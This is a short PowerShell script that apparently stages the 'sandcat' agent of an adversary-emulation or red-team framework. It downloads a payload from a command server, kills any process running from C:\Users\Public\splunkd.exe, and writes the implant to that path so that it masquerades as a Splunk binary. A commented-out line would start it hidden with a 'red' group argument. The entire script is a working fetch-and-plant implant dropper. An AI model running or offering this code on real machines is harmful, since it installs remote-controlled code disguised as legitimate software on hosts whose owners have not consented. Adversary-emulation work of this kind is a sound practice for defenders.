param($h = "0.0.0.0:8888"); 
$server = "http://$h"
$url = "$server/file/download";
$wc = New-Object System.Net.WebClient;
$wc.Headers.add("platform", "windows");
$wc.Headers.add("file", "sandcat.go");
echo $url
$data = $wc.DownloadData($url);
get-process | ? { $_.modules.filename -like "C:\Users\Public\splunkd.exe" } | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe", $data) | Out-Null;
# Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;